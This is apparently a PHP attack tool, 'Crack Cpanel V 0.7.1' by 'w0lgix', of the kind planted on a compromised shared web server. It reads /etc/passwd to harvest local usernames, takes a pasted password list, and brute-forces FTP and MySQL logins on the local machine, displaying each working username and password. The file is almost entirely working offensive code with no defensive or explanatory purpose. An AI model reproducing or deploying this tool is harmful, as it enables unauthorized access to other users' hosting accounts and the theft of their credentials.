<html>
<head><title>Cpanel</title></head>

<style> 
body {
    background: url("http://www.jumpy.co.il/admin/gallery/security_privacy_hacker_crime_thief_steal_data_information_digital_criminal_breach_binary_code_danger_safety_password-100411670-orig.jpg");
    background-size: 1500px 1300px;
    background-repeat: no-repeat;
    padding-top: 40px;
}
</style>

<body  text="white" >

<?php

///:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/

error_reporting(0);

echo "<center><center><h2><font color='blue' />Crack Cpanel V 0.7.1</h2></center></center>";
$a = fopen("/etc/passwd","r");
$read = fread($a, filesize("/etc/passwd"));
fclose($a);

$ok = 0;



$username = preg_replace("/:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/","", $read);
$username1 = explode("\n",$username);


$case =  "
<center><center><form action='cpanel.php' method='post' >
<select name='way'>
<option value='Cpanel'> Cpanel</option>
<option value='FTP'> FTP</option>
<option value='Soon!'> Soon!</option>
</select>
</from></center></center>
";

echo $case;

$selectOption = $_POST['way'];


switch ($selectOption) {
	
	case "Cpanel":
echo $brute;
	break;

	case "FTP":


if(isset($_POST['password']));

$a2 = explode("\r\n",$_POST['password']);


foreach ($username1 as $username2 ){

foreach ($a2 as $password1) {

if(isset($_POST['dump'])){
$ip = ftp_connect("127.0.0.1");
	if(ftp_login($ip, $username2, $password1))
	{

echo "<font bgcolor=black color=white>username is ===> (<b><font bgcolor=black color=red>$username2</font></b>) Password is ===> (<b><font color=red>$password1</font></b>)<br />";
$ok++;
echo "<hr><b>You Found <font color=red>$ok</font> FTP By w0lgix</b>\n";


		}

	  		}

	 			}

					}


	break;

	case "Soon!":
echo "";
die();
	break;

}




$pass = "S
<center><center>
<form  method='post'  >
<textarea rows=15 cols=70 size=88 name='password' >
</textarea>
<br ><br ><input type='submit' value='Crack' name='dump'/>
</form></center></center>
";

$brute =  "
<center><center>
<form  method='post'>
<textarea rows=15 cols=70 size=88888  >
$username
</textarea>
<br ><br >
";
if(isset($_POST['password']));

$a2 = explode("\r\n",$_POST['password']);


foreach ($username1 as $username2 ){

foreach ($a2 as $password1) {

if(isset($_POST['dump'])){

	if(@mysql_connect('localhost',$username2,$password1)){

echo "<font bgcolor=black color=white>username is ===> (<b><font bgcolor=black color=red>$username2</font></b>) Password is ===> (<b><font color=red>$password1</font></b>)<br />";
$ok++;
echo "<hr><b>You Found <font color=red>$ok</font> Cpanel By w0lgix</b>\n";


		}

	  		}

	 			}

					}



echo $brute;
echo $pass;

?>

</body>


</html>
